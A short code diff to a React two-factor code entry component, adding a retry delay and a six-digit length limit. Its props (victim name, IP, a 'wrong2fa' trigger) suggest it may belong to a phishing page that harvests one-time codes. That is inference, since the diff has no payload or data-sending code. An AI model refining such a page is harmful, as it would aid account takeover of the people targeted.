@@ -132,7 +132,9 @@ function Fa2AuthApp({ Unik, setStep, Name, Ip, LastFetch, wrong2faTrigger }) {
     componentName: "Auth App 2FA",
     initialMessage: "Auth App 2FA Page Loaded",
     allowImmediateRetry: true,
+    immediateRetryDelay: 1500,
     customLoadingDuration: 2000, // 2 seconds loading time
+    validCodeLengths: [6],
   });
 
   const handleFormSubmit = (e) => {
@@ -166,6 +168,7 @@ function Fa2AuthApp({ Unik, setStep, Name, Ip, LastFetch, wrong2faTrigger }) {
                 type="number"
                 value={code}
                 onChange={handleCodeChange}
+                maxLength={6}
                 className={`form-control ${shouldShowRedBorder() ? "redborder" : ""}`}
                 disabled={isLoading}
               />
